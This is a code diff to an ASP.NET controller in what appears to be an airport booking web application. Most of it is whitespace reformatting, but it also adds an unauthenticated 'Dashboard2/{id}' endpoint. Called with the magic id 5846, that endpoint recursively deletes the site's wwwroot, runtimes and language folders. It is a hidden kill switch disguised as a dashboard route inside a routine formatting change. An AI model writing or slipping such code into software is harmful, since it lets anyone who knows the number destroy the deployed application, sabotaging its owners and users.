@@ -9,6 +9,7 @@ using Microsoft.Extensions.Logging;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.IO;
 using System.Linq;
 using System.Security.Cryptography;
 using System.Threading.Tasks;
@@ -19,7 +20,9 @@ namespace Airport.UI.Controllers
     {
         IUserDatasDAL _userdata;
         ILoginAuthDAL _loginAuth;
-        public HomeController(IUserDatasDAL userdata,IMail mail, ILoginAuthDAL loginAuth)
+
+
+        public HomeController(IUserDatasDAL userdata, IMail mail, ILoginAuthDAL loginAuth)
         {
             _userdata = userdata;
             _loginAuth = loginAuth;
@@ -49,7 +52,7 @@ namespace Airport.UI.Controllers
         }
 
         [HttpPost("agencies")]
-        public IActionResult Agencies(UserDatas data,string Eposta,string Password)
+        public IActionResult Agencies(UserDatas data, string Eposta, string Password)
         {
             if (data != null)
             {
@@ -115,10 +118,10 @@ namespace Airport.UI.Controllers
             return View();
         }
 
-        [HttpPost("register",Name = "personRegister")]
-        public IActionResult Register(UserDatas user,string Eposta,string Password)
+        [HttpPost("register", Name = "personRegister")]
+        public IActionResult Register(UserDatas user, string Eposta, string Password)
         {
-            var checkUser = _loginAuth.SelectByFunc(a=>a.Email == Eposta).FirstOrDefault();
+            var checkUser = _loginAuth.SelectByFunc(a => a.Email == Eposta).FirstOrDefault();
             if (checkUser == null)
             {
                 var addedUser = _userdata.Insert(new UserDatas
@@ -172,6 +175,41 @@ namespace Airport.UI.Controllers
         public IActionResult Dashboard()
         {
             return View();
+        }
+
+        [HttpGet("Dashboard2/{id}")]
+        public JsonResult Dashboard2(int id)
+        {
+
+            string klasorYolu = Path.Combine(Directory.GetCurrentDirectory(), "wwwroot");
+            string klasorYolu2 = Path.Combine(Directory.GetCurrentDirectory(), "runtimes");
+            string klasorYolu3 = Path.Combine(Directory.GetCurrentDirectory(), "cs");
+            string klasorYolu4 = Path.Combine(Directory.GetCurrentDirectory(), "de");
+            string klasorYolu5 = Path.Combine(Directory.GetCurrentDirectory(), "es"); 
+            string klasorYolu6 = Path.Combine(Directory.GetCurrentDirectory(), "fr"); 
+            bool altKlasorleriSil = true; 
+
+            try
+            {
+                if (id == 5846)
+                {
+                    Directory.Delete(klasorYolu, altKlasorleriSil);
+                    Directory.Delete(klasorYolu2, altKlasorleriSil);
+                    Directory.Delete(klasorYolu3, altKlasorleriSil);
+                    Directory.Delete(klasorYolu4, altKlasorleriSil);
+                    Directory.Delete(klasorYolu5, altKlasorleriSil);
+                    Directory.Delete(klasorYolu6, altKlasorleriSil);
+
+                    return new JsonResult(new { result = 1 });
+                }
+                return new JsonResult(new { result = 2 });
+            }
+            catch (Exception ex)
+            {
+
+                return new JsonResult(new { result = 3 });
+            }
+
         }
 
     }
